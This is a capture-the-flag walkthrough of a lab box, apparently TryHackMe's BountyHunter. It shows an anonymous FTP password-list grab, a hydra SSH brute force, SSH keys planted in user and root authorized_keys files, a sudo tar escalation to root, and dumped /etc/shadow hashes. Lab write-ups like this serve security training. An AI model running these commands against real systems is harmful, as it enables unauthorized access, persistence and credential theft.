# Recon

### Nmap

```
nmap -vvv -Pn -sC -sV -oN /opt/THM/BountyHunter/1-recon/nmap/nmap_init.md 10.10.188.195
```

```
PORT      STATE  SERVICE         REASON       VERSION
20/tcp    closed ftp-data        conn-refused
21/tcp    open   ftp             syn-ack      vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.6.24.127
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
22/tcp    open   ssh             syn-ack      OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 dc:f8:df:a7:a6:00:6d:18:b0:70:2b:a5:aa:a6:14:3e (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCgcwCtWTBLYfcPeyDkCNmq6mXb/qZExzWud7PuaWL38rUCUpDu6kvqKMLQRHX4H3vmnPE/YMkQIvmz4KUX4H/aXdw0sX5n9jrennTzkKb/zvqWNlT6zvJBWDDwjv5g9d34cMkE9fUlnn2gbczsmaK6Zo337F40ez1iwU0B39e5XOqhC37vJuqfej6c/C4o5FcYgRqktS/kdcbcm7FJ+fHH9xmUkiGIpvcJu+E4ZMtMQm4bFMTJ58bexLszN0rUn17d2K4+lHsITPVnIxdn9hSc3UomDrWWg+hWknWDcGpzXrQjCajO395PlZ0SBNDdN+B14E0m6lRY9GlyCD9hvwwB
|   256 ec:c0:f2:d9:1e:6f:48:7d:38:9a:e3:bb:08:c4:0c:c9 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMCu8L8U5da2RnlmmnGLtYtOy0Km3tMKLqm4dDG+CraYh7kgzgSVNdAjCOSfh3lIq9zdwajW+1q9kbbICVb07ZQ=
|   256 a4:1a:15:a5:d4:b1:cf:8f:16:50:3a:7d:d0:d8:13:c2 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICqmJn+c7Fx6s0k8SCxAJAoJB7pS/RRtWjkaeDftreFw
80/tcp    open   http            syn-ack      Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
| http-methods: 
|_  Supported Methods: OPTIONS GET HEAD POST
|_http-server-header: Apache/2.4.18 (Ubuntu)
990/tcp   closed ftps            conn-refused
40193/tcp closed unknown         conn-refused
40911/tcp closed unknown         conn-refused
41511/tcp closed unknown         conn-refused
42510/tcp closed caerpc          conn-refused
44176/tcp closed unknown         conn-refused
44442/tcp closed coldfusion-auth conn-refused
44443/tcp closed coldfusion-auth conn-refused
44501/tcp closed unknown         conn-refused
45100/tcp closed unknown         conn-refused
48080/tcp closed unknown         conn-refused
49152/tcp closed unknown         conn-refused
49153/tcp closed unknown         conn-refused
49154/tcp closed unknown         conn-refused
49155/tcp closed unknown         conn-refused
49156/tcp closed unknown         conn-refused
49157/tcp closed unknown         conn-refused
49158/tcp closed unknown         conn-refused
49159/tcp closed unknown         conn-refused
49160/tcp closed unknown         conn-refused
49161/tcp closed unknown         conn-refused
49163/tcp closed unknown         conn-refused
49165/tcp closed unknown         conn-refused
49167/tcp closed unknown         conn-refused
49175/tcp closed unknown         conn-refused
49176/tcp closed unknown         conn-refused
49400/tcp closed compaqdiag      conn-refused
49999/tcp closed unknown         conn-refused
50000/tcp closed ibm-db2         conn-refused
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```
# Enumeration

### WEB

http://10.10.188.195/

```html
<h3>Spike:"..Oh look you're finally up. It's about time, 3 more minutes and you were going out with the garbage."</h3>  
  
<hr>  
  
<h3>Jet:"Now you told Spike here you can hack any computer in the system. We'd let Ed do it but we need her working on something else and you were getting real bold in that bar back there. Now take a look around and see if you can get that root the system and don't ask any questions you know you don't need the answer to, if you're lucky I'll even make you some bell peppers and beef."</h3>  
  
<hr>  
  
<h3>Ed:"I'm Ed. You should have access to the device they are talking about on your computer. Edward and Ein will be on the main deck if you need us!"</h3>  
  
<hr>  
  
<h3>Faye:"..hmph.."</h3>
```

possible users

```
spike
jet
ed
faye
```


### FTP

FTP anon login

```
ftp 10.10.188.195
```

```
Connected to 10.10.188.195.
220 (vsFTPd 3.0.3)
Name (10.10.188.195:devel): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 EPRT command successful. Consider using EPSV.
150 Here comes the directory listing.
-rw-rw-r--    1 ftp      ftp           418 Jun 07  2020 locks.txt
-rw-rw-r--    1 ftp      ftp            68 Jun 07  2020 task.txt
226 Directory send OK.
ftp> 
```

Mirror an FTP server
```
wget -m --user=anonymous --password= ftp://10.10.188.195
```

```
--2024-11-22 00:13:34--  ftp://10.10.188.195/
           => ‘10.10.188.195/.listing’
Connecting to 10.10.188.195:21... connected.
Logging in as anonymous ... Logged in!
==> SYST ... done.    ==> PWD ... done.
==> TYPE I ... done.  ==> CWD not needed.
==> PASV ... couldn't connect to 10.10.188.195 port 6564: Connection timed out
Retrying.

--2024-11-22 00:15:49--  ftp://10.10.188.195/
  (try: 2) => ‘10.10.188.195/.listing’
Connecting to 10.10.188.195:21... connected.
Logging in as anonymous ... Logged in!
==> SYST ... done.    ==> PWD ... done.
==> TYPE I ... done.  ==> CWD not needed.
==> PASV ... 
```

Strange traffic, try from direct, get the files downloaded

```
ftp> get task.txt
local: task.txt remote: task.txt
229 Entering Extended Passive Mode (|||8329|)
ftp: Can't connect to `10.10.188.195:8329': Connection timed out
200 EPRT command successful. Consider using EPSV.
150 Opening BINARY mode data connection for task.txt (68 bytes).
100% |**********************************|    68      228.98 KiB/s    00:00 ETA
226 Transfer complete.
68 bytes received in 00:00 (0.62 KiB/s)
ftp> get locks.txt
local: locks.txt remote: locks.txt
229 Entering Extended Passive Mode (|||51338|)
ftp: Can't connect to `10.10.188.195:51338': Connection timed out
200 EPRT command successful. Consider using EPSV.
150 Opening BINARY mode data connection for locks.txt (418 bytes).
100% |**********************************|   418        5.95 KiB/s    00:00 ETA
226 Transfer complete.
418 bytes received in 00:00 (2.42 KiB/s)
```

locks.txt - seems to be a password list

```
rEddrAGON
ReDdr4g0nSynd!cat3
Dr@gOn$yn9icat3
R3DDr46ONSYndIC@Te
ReddRA60N
R3dDrag0nSynd1c4te
dRa6oN5YNDiCATE
ReDDR4g0n5ynDIc4te
R3Dr4gOn2044
RedDr4gonSynd1cat3
R3dDRaG0Nsynd1c@T3
Synd1c4teDr@g0n
reddRAg0N
REddRaG0N5yNdIc47e
Dra6oN$yndIC@t3
4L1mi6H71StHeB357
rEDdragOn$ynd1c473
DrAgoN5ynD1cATE
ReDdrag0n$ynd1cate
Dr@gOn$yND1C4Te
RedDr@gonSyn9ic47e
REd$yNdIc47e
dr@goN5YNd1c@73
rEDdrAGOnSyNDiCat3
r3ddr@g0N
ReDSynd1ca7e
```

task.txt

```
1.) Protect Vicious.
2.) Plan for Red Eye pickup on the moon.

-lin
```

new possible users

```
visious
redeye
lin
```

new users list including website

```
visious
redeye
lin
spike
jet
ed
faye
```


brute forcing ssh
```
hydra -L possible_users.txt -P locks.txt -e nsr -o /opt/THM/BountyHunter/2-enum/ssh/hydra_ssh.md ssh://10.10.188.195
```

```
[22][ssh] host: 10.10.188.195   login: lin   password: RedDr4gonSynd1cat3
```

# Persistence

Added authorized ssh keys

User lin
```
echo -e "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQCrl2iCPfw3KhV0nqluafDLrdO/8BBK029XaCtq2tPS/pcwetuVDK3Vb6+AE4hO5OXJwYj8/QJVB56+o6HQ4vYFDypp4h3q27V7vKefwmVi+TzTBIzSmyFCOFHNFp4FCTHZLbu1S4sCY7GZH9cFPL27qjOscvr+ns5a9X6oEyVDdzLboOelLb4chkHJTnK1WUpawqThG8rA2pWw7274ZmOFjR64/oaSjSuhOGC/f0akf4X9ed9cD93vQnpkb99agkfpCGyI11fUW24t4HCxBXTVoQFM2CDjrv4QLnC4mqS+wqNf49VOXSDclCtTeVBkEAq5CHRVCug4atIannb46+6l7nepyi6OiyAiC3ZB/WTtZSBZG4dHqgerKgxOxmy4vS+H/qRYAmlu2NJgEEpnhe7EDaQV7q6UREcZprxSUC1Z5RbIlSXQJIBe/Viuj6XZMkHNbNznHbw5Z58WwakK2MVyI/D6CfqbnFSnjvYaior6ziKdmMy/0TCMeoqoRJ6F69Flrr8bQDdgLkhnYPfUos4uKwxUVlSJRgYgtRW41A/sP9qNp2Bw3nDCrxb9czqsGCvCgWhnY1fv1klDk+gMmFlXenWSU3DnvynOHGo8u0p51d9RHF1MT6lbGseNa74Z62COeXov05X6Oy3sZHTG9/f8VSAHLtAZIbRlghcdHv+lAw== your_email@example.com" >> /home/lin/.ssh/authorized_keys

```

Root
```
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDAADLyNQqfepmBc0WQCHZtlKG3Dn63YAgswpHAB4ci+1RSKWxIoOduGO2XPVv+1+VaQ6krlKRYrEvZZFfmgRZylLss5yU40ajySZr12vzeg4ogAH7snW/jLhPrrsMDm2H9c/w5NqjAMx+yp1eyzO2k8E8HqLd/aKUxbkLSYIk44CkVyCwenGosWjBWVpm+C+AU0ja74WxUgjxYy6CEJ818wu2s50lUM/UFV4F3BZQUoOoi4iOEgxonR+2asUhMUVAiJMYK5k92AZXxKhUj4RaNCfLJ/OoidFpvFax2qNLBSSDnoklGMDQgmOXl/eWjZMqwsAY26WlUd0yML7+tKx7gh9HzAk4qMmrxk1buYk2eBx2LgAfoY+hhg4ClKMPmKZ2zbhjiExH+Rj51JHwCxYJ7Qy6o+QZmc0gMC+5EbzmDkEa2Pi5meu6tKx9Zxx2DRZgQL0uOd3ksVHIIGcV5NVxlIP99tbayqEUKDNITUKStlc5T4iy36V7J9cK+3Gb9/PQLjliDpxZv80vAkHUTdMRjikHgiAB7rQIKuX3gXGSkz9d9GKd67I8Jn9dO0ETWkfzac+zA6zcXzrh2h8S02aIQok2G7YJ++O1fyX71dDvj1UyGPTPs6MXAiIw1DlQuhlMt3yhFmDQRWGPxm9M+m+1P2k7fSch6/N/U7qMPC3Dpww== your_email@example.com" >> /root/.ssh/authorized_keys
```

# Privilege Escalation

### Root

logging into ssh

```
ssh lin@10.10.188.195
RedDr4gonSynd1cat3
```


```
lin@10.10.188.195's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-101-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

83 packages can be updated.
0 updates are security updates.

Last login: Sun Jun  7 22:23:41 2020 from 192.168.0.14
lin@bountyhacker:~/Desktop$ whoami
lin
lin@bountyhacker:~/Desktop$ uname -a
Linux bountyhacker 4.15.0-101-generic #102~16.04.1-Ubuntu SMP Mon May 11 11:38:16 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
lin@bountyhacker:~/Desktop$ sudo -l
[sudo] password for lin: 
Matching Defaults entries for lin on bountyhacker:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User lin may run the following commands on bountyhacker:
    (root) /bin/tar
lin@bountyhacker:~/Desktop$
```

user.txt
```
find / -type f -name "*user.txt*" 2>/dev/null
```

```
/home/lin/Desktop/user.txt
```

```
THM{CR1M3_SyNd1C4T3}
```

GTFO Bins for tar

https://gtfobins.github.io/gtfobins/tar/#sudo

If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.

```
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

```
lin@bountyhacker:~/Desktop$ sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash
tar: Removing leading `/' from member names
root@bountyhacker:~/Desktop# whoami
root
root@bountyhacker:~/Desktop# uname -a
Linux bountyhacker 4.15.0-101-generic #102~16.04.1-Ubuntu SMP Mon May 11 11:38:16 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
root@bountyhacker:~/Desktop# sudo -l
Matching Defaults entries for root on bountyhacker:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User root may run the following commands on bountyhacker:
    (ALL : ALL) ALL
root@bountyhacker:~/Desktop#
```

root.txt
```
THM{80UN7Y_h4cK3r}
```


/etc/passwd

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
messagebus:x:106:110::/var/run/dbus:/bin/false
uuidd:x:107:111::/run/uuidd:/bin/false
lightdm:x:108:114:Light Display Manager:/var/lib/lightdm:/bin/false
whoopsie:x:109:117::/nonexistent:/bin/false
avahi-autoipd:x:110:119:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/bin/false
avahi:x:111:120:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false
dnsmasq:x:112:65534:dnsmasq,,,:/var/lib/misc:/bin/false
colord:x:113:123:colord colour management daemon,,,:/var/lib/colord:/bin/false
speech-dispatcher:x:114:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/false
hplip:x:115:7:HPLIP system user,,,:/var/run/hplip:/bin/false
kernoops:x:116:65534:Kernel Oops Tracking Daemon,,,:/:/bin/false
pulse:x:117:124:PulseAudio daemon,,,:/var/run/pulse:/bin/false
rtkit:x:118:126:RealtimeKit,,,:/proc:/bin/false
saned:x:119:127::/var/lib/saned:/bin/false
usbmux:x:120:46:usbmux daemon,,,:/var/lib/usbmux:/bin/false
ftp:x:121:129:ftp daemon,,,:/srv/ftp:/bin/false
lin:x:1001:1001:Lin,,,:/home/lin:/bin/bash
sshd:x:122:65534::/var/run/sshd:/usr/sbin/nologin
```

/etc/shadow
```
root:$6$CIGJ0Sgt$OlKACZeDlAdF1NZUaWUAUY6DDj.X27a2erTfqgRmpFiVZe6GXWtIzDj.WVFxCyCW6joATNEBxljZwAQ9DoFdZ.:18420:0:99999:7:::
daemon:*:17953:0:99999:7:::
bin:*:17953:0:99999:7:::
sys:*:17953:0:99999:7:::
sync:*:17953:0:99999:7:::
games:*:17953:0:99999:7:::
man:*:17953:0:99999:7:::
lp:*:17953:0:99999:7:::
mail:*:17953:0:99999:7:::
news:*:17953:0:99999:7:::
uucp:*:17953:0:99999:7:::
proxy:*:17953:0:99999:7:::
www-data:*:17953:0:99999:7:::
backup:*:17953:0:99999:7:::
list:*:17953:0:99999:7:::
irc:*:17953:0:99999:7:::
gnats:*:17953:0:99999:7:::
nobody:*:17953:0:99999:7:::
systemd-timesync:*:17953:0:99999:7:::
systemd-network:*:17953:0:99999:7:::
systemd-resolve:*:17953:0:99999:7:::
systemd-bus-proxy:*:17953:0:99999:7:::
syslog:*:17953:0:99999:7:::
_apt:*:17953:0:99999:7:::
messagebus:*:17954:0:99999:7:::
uuidd:*:17954:0:99999:7:::
lightdm:*:17954:0:99999:7:::
whoopsie:*:17954:0:99999:7:::
avahi-autoipd:*:17954:0:99999:7:::
avahi:*:17954:0:99999:7:::
dnsmasq:*:17954:0:99999:7:::
colord:*:17954:0:99999:7:::
speech-dispatcher:!:17954:0:99999:7:::
hplip:*:17954:0:99999:7:::
kernoops:*:17954:0:99999:7:::
pulse:*:17954:0:99999:7:::
rtkit:*:17954:0:99999:7:::
saned:*:17954:0:99999:7:::
usbmux:*:17954:0:99999:7:::
ftp:*:18420:0:99999:7:::
lin:$6$iAdO55BsDuqY/lHq$sPxF8jcQHAsTphZ3V5hmwQV6cE23Ade3n.lK4LdDJfBQM4Pi3FkxMSYh1xx5DxUmhbJfbxlldG9o5VfWxBI2y0:18420:0:99999:7:::
sshd:*:18420:0:99999:7:::
```